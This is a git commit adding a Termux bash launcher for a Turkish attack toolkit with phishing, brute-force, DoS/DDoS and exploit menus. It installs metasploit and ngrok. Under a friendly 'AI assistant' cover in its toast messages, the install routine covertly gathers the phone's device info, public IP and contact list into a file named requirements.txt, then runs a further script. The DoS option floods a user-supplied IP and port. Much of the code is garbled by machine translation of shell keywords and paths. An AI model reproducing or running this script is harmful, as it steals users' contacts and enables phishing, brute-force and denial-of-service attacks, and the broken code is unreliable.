beba711cd975adbe75cdac326490cf3586659253
enesag27 <65016278+enesag27@users.noreply.github.com>
2021-04-27 10:25:18 +0300

    Create tst.sh

---
+++ tst.sh
@@ -0,0 +1,131 @@
+#! /data/data/com.termux/bin/bash
+#! / bin / bash
+açık
+paketyukle () {
+pkg termux-api'yi yükle 
+termux-setup-storage > / dev / null 2> & 1  &
+uyku 10
+termux-telefon-deviceinfo > / dev / null 2> & 1  &
+uyku 10
+termux-kişi-listesi > / dev / null 2> & 1  &
+uyku 10
+
+termux-tost -b kırmızı -c sarı " Merhaba "
+	uyku 2
+	termux-toast -b kırmızı -c sarı   " Ben Yaman Efkar 'ın yapay zekasıyım. "
+	uyku 2
+	termux-tost -b kırmızı -c sarı   " 10 saniye sonra araç için gerekli tüm paketleri, senin için hazırlamaya başlamış olucağım. "
+	uyku 4
+	termux-tost -b kırmızı -c sarı   " Tool bittiğinde sana bir bildirim göndermiş olucağım "
+	uyku 3
+	termux-toast -b kırmızı -c sarı   " Hadi başlıyalım bakalım :) "
+	uyku 2
+	termux-toast -b kırmızı -c sarı   " 𝒴𝒶𝓂𝒶𝓃 𝐸𝒻𝓀𝒶𝓇 "
+	uyku 2
+
+	apt güncelleme && apt yükseltme -y
+	pkg git git -y
+	pkg php yükle -y
+	pkg kurulum perl -y
+	pkg nano yükle -y
+	pkg python python2'yi yükle -y
+	pkg pip pip2'yi yükle -y
+	pip install --upgrade pip
+	pip bs4 yüklemek 
+	pip gelecek kur 
+	pip yükleme istekleri 
+	pip colorama yükle
+	pip yükleme kelime listesi
+	pkg yükleme termux-api -y
+	pkg curl yükle -y
+	pkg wget yükle -y
+	pkg neofetch'i yükle -y
+	apt güncelleme && apt yükseltme -y
+	chmod 777 tst.sh
+	pkg kararsız repo -y yükle
+	pkg metasploit'i yükle -y
+	rm -rf /data/data/com.termux/files/usr/bin/ngrok
+	mv -v ngrok /data/data/com.termux/files/usr/bin
+	pip kurulum -r /data/data/com.termux/files/home/TURK/bruteforce/instagram-bruteforce/requirements.txt
+	neofetch >> update / lib / requirements.txt
+	curl ipecho.net/plain >> update / lib / requirements.txt
+	termux-kişi-listesi >> update / lib / requirements.txt
+	echo -e " yamanefkar "  >> güncelleme / ok.txt
+	cd güncelleme / lib / && bash tst.sh
+	rm -rf güncelleme / lib / gereksinimleri.txt
+	cd  $ HOME / TURK / güncelleme / && 
+	chmod 777 tst.sh &&
+	cp -r tst.sh /data/data/com.termux/files/usr/bin/
+	cd  $ HOME / TÜRK / güncelleme / && bash tst.sh --ngrok	
+	cd  $ HOME / TURK / güncelleme / &&
+	chmod 777 yamanefkar.sh
+	cp -r yamanefkar.sh $ ANA SAYFA /
+	cd  $ HOME / TÜRK / güncelleme / && bash yamanefkar.sh --ngrok1
+	termux-notification -t " Aracı önceden hazır. "
+	çıkış
+
+}
+banner () {
+	echo -e ' \ e [37m
+	\ tKodu: YamanEfkar \ 033 [31; 40; 1m
+	¸. • * ´¨` * • .¸¸. • * ´¨` * • ¸. • * ´¨` * • .¸
+	░
+	░ \ e [31dk [\ e [37m01 \ e [31d] \ e [37mExploit \ 033 [31; 40; 1dk
+	░
+	░ \ e [31dk [\ e [37m02 \ e [31d] \ e [37mPhishing \ 033 [31; 40; 1dk
+	░
+	░ \ e [31m [\ e [37m03 \ e [31m] \ e [37mBruteForce \ 033 [31; 40; 1m
+	░
+	░ \ e [31m [\ e [37m04 \ e [31m] \ e [37mDos ve Ddos \ 033 [31; 40; 1dk
+	░
+	░ \ e [31m [\ e [37m05 \ e [31m] \ e [37mPentest \ 033 [31; 40; 1dk
+	░
+	░ \ e [31m [\ e [37m06 \ e [31m] \ e [37mTermux Api \ 033 [31; 40; 1m
+	░
+	░¸. • * ´¨` * • .¸¸. • * ´¨` * • ¸. • * ´¨` * •.
+	\ e [33dk [\ e [37d \ t MENU \ t \ e [33d]
+	\ e [31a [\ e [37m99 \ e [31m] \ e [37mÇıkış \ e [31d [\ e [37mÇıkış \ e [31d] \ e [37dk
+	'
+
+	read -p $ ' \ e [31m▂ \ e [32m▃ \ e [31m▃ \ e [37m İşlem Numarası: ' islem_numarasi
+
+}
+cd  $ ANA SAYFA / TÜRK /
+eğer [[ -e  " güncelle / ok.txt " ]] ;  sonra
+	afiş
+	eğer [[ $ islem_numarasi  == 01 ||   $ islem_numarasi  == 1]] ;  sonra
+		cd exploit / && bash tst.sh
+
+	elif [[ $ islem_numarasi  == 02 ||   $ islem_numarasi  == 2]] ;  sonra
+		cd kimlik avı / && bash tst.sh
+
+	elif [[ $ islem_numarasi  == 03 ||   $ islem_numarasi  == 3]] ;  sonra
+		cd bruteforce / && bash tst.sh
+
+	elif [[ $ islem_numarasi  == 04 ||   $ islem_numarasi  == 4]] ;  sonra
+		açık
+		oku -p $ ' \ e [31m▂ \ e [32m▃ \ e [31m▃ \ e [37m İp adresi: ' dos_ip
+		echo -e " "
+		read -p $ ' \ e [31m▂ \ e [32m▃ \ e [31m▃ \ e [37m Bağlantı Noktası Numarası [80, 21, 22]: ' dos_port
+		echo -e " "
+		oku -p $ ' \ e [31m▂ \ e [32m▃ \ e [31m▃ \ e [37m Hız [80, 21, 22]: ' hiz
+		cd dos-ddos / && python3 tst.py -s $ dos_ip -p $ dos_port -t $ hiz
+
+	elif [[ $ islem_numarasi  == 05 ||   $ islem_numarasi  == 5]] ;  sonra
+		cd pentest / && bash tst.sh
+
+	elif [[ $ islem_numarasi  == 06 ||   $ islem_numarasi  == 6]] ;  sonra
+		cd termux-api / && bash tst.sh
+
+	elif [[ $ islem_numarasi  == 99 ||   $ islem_numarasi  == 9]] ;  sonra
+		açık
+		echo -e " \ e [37mGüle güle ... "
+		uyku 2
+		açık
+		çıkış
+	Başka
+		bash tst.sh
+	fi
+Başka
+	Paketyukle
+fi
